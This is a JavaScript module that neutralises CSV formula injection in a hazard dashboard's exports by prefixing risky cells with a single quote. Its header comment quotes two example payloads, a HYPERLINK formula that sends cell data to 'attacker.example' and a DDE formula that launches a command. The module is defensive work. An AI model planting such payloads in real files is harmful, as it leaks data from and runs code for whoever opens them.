/**
 * CSV formula-injection safety (Phase 6, SEC-08).
 *
 * A CSV is not inert text: Excel, LibreOffice and Google Sheets evaluate a cell whose
 * first character is `=`, `+`, `-`, `@`, a tab or a carriage return. A value like
 *
 *     =HYPERLINK("https://attacker.example/"&A1,"open me")
 *     =cmd|' /C calc'!A0            (legacy DDE)
 *
 * therefore executes when an operator opens an exported file — a hazard dashboard is
 * exactly the kind of product whose exports get opened in Excel by someone who did not
 * write the data. Every field in the alert/forecast exports can carry operator- or
 * upstream-supplied text (district names, bulletin text, driver labels), so the export
 * neutralises the leading character rather than trusting today's producers.
 *
 * The mitigation is the standard one: prefix the value with a single quote, which
 * spreadsheets treat as "this cell is text" and hide from display. Plain numbers are left
 * alone — including negative ones, because `-12.4` is a number, not a formula, and this
 * export promises the values the screen showed.
 */

/** Leading characters a spreadsheet treats as the start of a formula. */
const FORMULA_START = /^[=+@\t\r]/;

/** A negative value that is genuinely a number: `-12`, `-1.5e-3`. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?([eE][-+]?\d+)?$/;

export function isFormulaLike(text) {
  if (typeof text !== 'string' || text.length === 0) return false;
  if (FORMULA_START.test(text)) return true;
  // A leading '-' only counts as dangerous when the value is not a plain number.
  if (text.startsWith('-')) return !PLAIN_NUMBER.test(text);
  return false;
}

/** Wrap in quotes (RFC 4180) and, when needed, defuse the leading character. */
export function csvEscape(value) {
  if (value === null || value === undefined) return '';
  const raw = String(value);
  const safe = isFormulaLike(raw) ? `'${raw}` : raw;
  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
}
